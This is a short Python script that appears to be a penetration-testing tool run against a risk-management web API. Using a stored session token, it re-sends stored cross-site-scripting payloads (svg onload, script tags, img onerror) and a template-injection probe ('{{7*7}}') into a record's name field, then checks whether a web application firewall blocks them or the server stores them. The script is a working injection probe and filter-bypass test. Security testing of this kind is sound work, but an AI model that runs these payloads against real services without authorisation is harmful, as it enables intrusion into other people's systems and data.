import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
def call(m,p,body=None):
    cmd=['curl','-s','-m','25','-o','/tmp/hb','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/hb',encoding='utf-8',errors='replace').read()
tag='ZXD'+uuid.uuid4().hex[:5]
print("=== re-test the exact payloads that 403'd earlier ===")
for label,pay in [
 ('svg-full', f'<svg onload=alert(1)>{tag}'),
 ('script-full', f'<script>alert(1)</script>{tag}'),
 ('onerror-full', f'<img src=x onerror=alert(1)>{tag}'),
 ('brace-full', f'{{{{7*7}}}}{tag}'),
 ('svg-bare', f'<svg>{tag}</svg>'),
 ('brace-bare', f'{{{{7*7}}}}{tag}'),
]:
    c,b=call('POST','/api/v1/risks',{"risk":{"name":pay}})
    stored=''
    if c in ('200','201'):
        try: stored=repr(json.loads(b)['risks'][0].get('name'))[:70]
        except: stored=''
    else:
        stored=b[:120].replace(chr(10),' ')
    print(f"  {label:14} {c:>4}  {stored}")
print()
print("=== full 403 body for one case ===")
c,b=call('POST','/api/v1/risks',{"risk":{"name":f'<svg onload=alert(1)>{tag}'}})
print(f"  code={c}")
print(f"  body={b[:400]}")
